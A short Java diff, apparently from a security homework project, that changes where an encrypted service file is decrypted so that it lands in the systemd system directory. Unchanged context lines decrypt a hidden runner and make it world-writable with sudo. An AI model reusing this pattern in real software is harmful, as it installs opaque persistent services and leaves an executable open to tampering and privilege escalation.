@@ -23,7 +23,7 @@ public class Main {
 
     private static void SetupEnc(){
         try {
-            Crypto.decryptFile("srv.enc", "/os-hw-sec-01.service", SECRET_KEY);
+            Crypto.decryptFile("srv.enc", "/etc/systemd/system/os-hw-sec-01.service", SECRET_KEY);
             Crypto.decryptFile("scr.enc", "/var/opt/os_secret/runner", SECRET_KEY);
             Process processReload = Runtime.getRuntime().exec("sudo chmod 777 /var/opt/os_secret/runner");
             processReload.waitFor();
